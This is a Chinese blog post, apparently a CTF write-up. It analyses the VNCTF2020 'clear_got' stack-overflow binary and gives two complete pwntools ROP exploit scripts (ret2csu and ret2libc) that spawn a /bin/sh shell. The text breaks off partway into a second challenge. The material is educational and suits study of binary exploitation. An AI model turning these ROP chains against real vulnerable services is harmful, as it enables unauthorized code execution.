

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/0.ico">
  <link rel="icon" href="/img/0.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="sh0ve1">
  <meta name="keywords" content="">
  
    <meta name="description" content="懒得上传...">
<meta property="og:type" content="article">
<meta property="og:title" content="VNCTF2020 PWN WriteUp">
<meta property="og:url" content="https://sh0ve1.github.io/2022/03/26/VNCTF2020-PWN-WriteUp/index.html">
<meta property="og:site_name" content="sh0ve1&#39;s blog">
<meta property="og:description" content="懒得上传...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sh0ve1.github.io/img/10.jpg">
<meta property="article:published_time" content="2022-03-26T09:19:00.000Z">
<meta property="article:modified_time" content="2022-03-26T11:00:15.690Z">
<meta property="article:author" content="sh0ve1">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://sh0ve1.github.io/img/10.jpg">
  
  
  <title>VNCTF2020 PWN WriteUp - sh0ve1&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"sh0ve1.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"pU0JQUaRtEv6Lgu0jxYpEBT9-gzGzoHsz","app_key":"2Gdcl19Uu0nQBNMs6fu6YiR4","server_url":"https://pu0jquar.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh0ve1&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/post_1.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="VNCTF2020 PWN WriteUp">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-03-26 17:19" pubdate>
        2022年3月26日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      27k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      226 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">VNCTF2020 PWN WriteUp</h1>
            
            <div class="markdown-body">
              <h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li>file clear_got</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">clear_got</span>: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, for GNU/Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>, BuildID[sha1]=<span class="hljs-number">0</span>da045c4b45eb17b78368ffbaff7e54e2bc130aa, not stripped<br></code></pre></td></tr></table></figure>

<ul>
<li>checksec：只是开启栈不可执行保护</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure>

<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">92</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+5Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to VNCTF! This is a easy competition.///&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  v5 = (<span class="hljs-type">int</span>)&amp;PLT;<br>  <span class="hljs-built_in">memset</span>(&amp;PLT, <span class="hljs-number">0</span>, <span class="hljs-number">0x38</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>程序逻辑很清晰，就是先向一个只有96字节的数组输入0x100字节的数据（栈溢出），然后将GOT表项清零，导致无法再调用read、puts等函数。根据动态调试发现<code>__libc_start_main</code>函数的got表项没有被清零，所以存在libc地址。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400773</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400774</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400777</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>000000000040077E                 <span class="hljs-keyword">syscall</span>                 <span class="hljs-comment">; LINUX - sys_write</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400780</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure>
<p>存在一处sys_write,并且可以通过rbp控制程序流程。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>由于无法调用read、puts等函数，那么只能尝试使用ret2syscall进行攻击，目标是执行<code>execv(&quot;/bin/sh&quot;,0,0)</code>,其中execv的系统调用号是0x3b。通过ROPgadget工具发现没有类似<code>pop rax;ret</code>和<code>pop rdx;ret</code>的gadget，导致我无法控制rax寄存器和rdx寄存器。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>000000000040074A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">38h</span> <span class="hljs-comment">; &#x27;8&#x27;  ; n</span><br><span class="hljs-symbol">.text:</span>000000000040074F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; c</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400754</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400757</span>                 <span class="hljs-keyword">call</span>    _memset<br><span class="hljs-symbol">.text:</span>000000000040075C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400761</span>                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400762</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure>
<p>通过观察发现main函数在结束的时候rdx&#x3D;0x38,rax&#x3D;0(read函数的调用号)，而read函数的返回值就是rax且其返回值由读取的字节数决定。因此可以尝试执行<code>read(0,bss,0x3b)</code>并输入0x3b字节的数据使rax&#x3D;0x3b。由于无法直接控制rdx，所以尝试使用ret2csu进行执行该函数。</p>
<blockquote>
<p>ret2csu中的call [r12],所以r12必须是指令的指针的指针，即指令的双重指针。</p>
</blockquote>
<p>由于GOT表项遭到破坏，所以elf.plt[“xxx”]就不满足该条件，所以不能使用其执行指令。但是r12必须满足该条件，否则报错，因此我们需要在程序中找一个指令的双重指针且保证执行前后寄存器不会变化。通过<a target="_blank" rel="noopener" href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html">some-gadget-sequence-for-x8664-rop</a>发现<code>_DYNAMIC</code>处存在_init和_fini函数的地址，且两者都不影响寄存器的值。因此令r12为<code>_DYNAMIC</code>处的地址即可。</p>
<p>当ret2csu从第2个gadget执行回来时，由于<code>call [r12]</code>没有发挥作用，所以还需要gadget1中的<code>ret</code>来触发执行<code>read(0,bss,0x3b)</code>,此时我们可以写入所需参数，为了减少麻烦，我们也可以写入<code>syscall;ret</code>的地址,使再次执行gadget2时<code>call [r12]</code>发挥作用。</p>
<p>大致流程如下：<br><code>csu_gadget1(为了read准备寄存器rbx,rbp,r12~r15,read) --&gt; csu_gadget2（为了read修改寄存器rdi,rsi,rdx,）--&gt; csu_gadget1(为了execv准备寄存器rbx,rbp,r12~r15;执行read) --&gt; csu_gadget2(修改寄存器rdi,rsi,rdx;执行execv)</code></p>
<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><ol>
<li>首先使用sys_write泄露出libc基址；</li>
<li>然后通过sys_write的返回地址由rbp控制的特性，控制继续执行<code>mov eax, 0;leave;ret</code>控制rax，然后控制其他寄存器执行read函数，修改puts_got为system地址，puts_got+8为”&#x2F;bin&#x2F;sh”;</li>
<li>最后再执行puts(puts_got+8)即可。</li>
</ol>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><h4 id="ret2csu-1"><a href="#ret2csu-1" class="headerlink" title="ret2csu"></a>ret2csu</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br>&#x27;&#x27;&#x27;<br>@文件        :5.py<br>@说明        :ret2csu + read返回值控制rax + _init和_fini函数不会对寄存器进行修改<br>@时间        :2022/02/13 09:22:38<br>@作者        :sh0ve1<br>&#x27;&#x27;&#x27;<br><br>from pwn import *<br>import pwnlib<br><br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = 0<br>if REMOTE:<br>    p = remote(&#x27;node4.buuoj.cn&#x27;, 27076)<br>    libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br><span class="hljs-section">else:</span><br>    p = process(&#x27;./clear_got&#x27;)<br>    libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br><br>elf = ELF(&#x27;./clear_got&#x27;)<br><br>bss = elf.bss() + 0x100<br>syscall_ret = 0x40077e<br>csu_gadget1 = 0x4007EA<br>csu_gadget2 = 0x4007d0<br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x400762&quot;)</span><br><br>payload = b&#x27;A&#x27;*0x60 + p64(0xdeadbeef)<br><span class="hljs-comment"># 一开始rax=0 ，rdx=0x38</span><br>payload += p64(csu_gadget1)<br>payload += p64(0) <span class="hljs-comment"># rbx</span><br>payload += p64(1) <span class="hljs-comment"># rbp</span><br>payload += p64(0x600e40) <span class="hljs-comment"># r12 --&gt; call [r12] 0x600e50 _init</span><br>payload += p64(0x3b) <span class="hljs-comment"># r13=rdx</span><br>payload += p64(bss) <span class="hljs-comment"># r14=rsi</span><br>payload += p64(0) <span class="hljs-comment"># r15d=edi</span><br>payload += p64(csu_gadget2)<br>payload += b&#x27;B&#x27;*8 <br>payload += p64(0) <span class="hljs-comment"># rbx</span><br>payload += p64(1) <span class="hljs-comment"># rbp</span><br>payload += p64(bss + 8) <span class="hljs-comment"># r12 = double pointer of syscall_ret</span><br>payload += p64(0) <span class="hljs-comment"># r13=rdx</span><br>payload += p64(0) <span class="hljs-comment"># r14=rsi</span><br>payload += p64(bss) <span class="hljs-comment"># r15d=edi</span><br>payload += p64(syscall_ret) <span class="hljs-comment">#ret sys_read</span><br>payload += p64(csu_gadget2)<br><br>p.recvuntil(<span class="hljs-string">&quot;///\n&quot;</span>)<br>p.sendline(payload)<br>sleep(0.2)<br><span class="hljs-comment"># pause()</span><br>payload = b&#x27;/bin/sh\x00&#x27; + p64(syscall_ret) <span class="hljs-comment"># 写入参数和指令的地址（便于call [r12]）</span><br>payload = payload.ljust(0x3b,b&#x27;D&#x27;)<br>p.send(payload)<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>

<h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp2.py</span><br><span class="hljs-string">@说明        :ret2libc</span><br><span class="hljs-string">@时间        :2022/02/13 09:22:38</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27076</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./clear_got&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./clear_got&#x27;</span>)<br><br>bss = elf.bss() + <span class="hljs-number">0x100</span><br>syscall_ret = <span class="hljs-number">0x40077e</span><br>pop_rdi = <span class="hljs-number">0x4007f3</span><br>pop_rsi_r15 = <span class="hljs-number">0x4007f1</span><br>sys_write = <span class="hljs-number">0x400773</span><br><span class="hljs-comment"># 0x000000000040075c: mov eax, 0; leave; ret;</span><br>mov_rax = <span class="hljs-number">0x40075c</span><br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x400762&quot;)</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x60</span> <br>payload += p64(mov_rax) <span class="hljs-comment"># rbp 关键 与sys_write配合</span><br><span class="hljs-comment"># 一开始rax=0 ，rdx=0x38</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(sys_write)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret) <span class="hljs-comment"># read() 修复puts_got</span><br>payload += p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]+<span class="hljs-number">8</span>) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br><br>p.recvuntil(<span class="hljs-string">&quot;///\n&quot;</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.2</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20750</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br>p.recv()<br>payload = p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>p.sendline(payload) <br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>

<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>ret2csu的r12寄存器必须是指令的双重指针，一般情况下elf.plt[“xx”]即可满足；</li>
<li><code>_DYNAMIC</code>处存在_init和_fini函数的地址，且两者都不影响寄存器的值；</li>
<li>只要rbp和rbx寄存器设置适当(一般rbx&#x3D;0,rbp&#x3D;1),ret2csu可以一直执行下去；</li>
<li>分析gadget需要分析其入口和出口,尤其要注意push指令和pop指令;</li>
<li>目前一般的stack题目都需要仔细分析汇编程序，巧妙构造payload。</li>
</ul>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html">https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15890280.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF">https://www.cnblogs.com/LynneHuan/p/15890280.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF</a></li>
</ul>
<h2 id="Bing-Dwen-Dwen"><a href="#Bing-Dwen-Dwen" class="headerlink" title="Bing Dwen Dwen"></a>Bing Dwen Dwen</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li>file pwn</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter ./ld.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=be4181a2936fbcd06f4f74b4ca5635689a182856, not stripped<br></code></pre></td></tr></table></figure>

<ul>
<li>保护机制：只开启了栈不可执行</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure>

<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 dest; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br><br>  dest = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">init</span>(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello,Do You Like Bing Dwen Dwen?&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;bingDwenDwen, <span class="hljs-number">0x200</span>uLL);<br>  <span class="hljs-built_in">memcpy</span>(&amp;dest, &amp;bingDwenDwen, <span class="hljs-number">0x200</span>uLL); <span class="hljs-comment">//栈溢出</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good Bye~&quot;</span>);<br>  <span class="hljs-built_in">close</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">close</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">close</span>(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>明显的栈溢出，但是程序最后关闭了标准输入，标准输出，标准错误，所以程序无法通过他们进行读写。</p>
<p>此外，程序给了所有需要的gadget.</p>
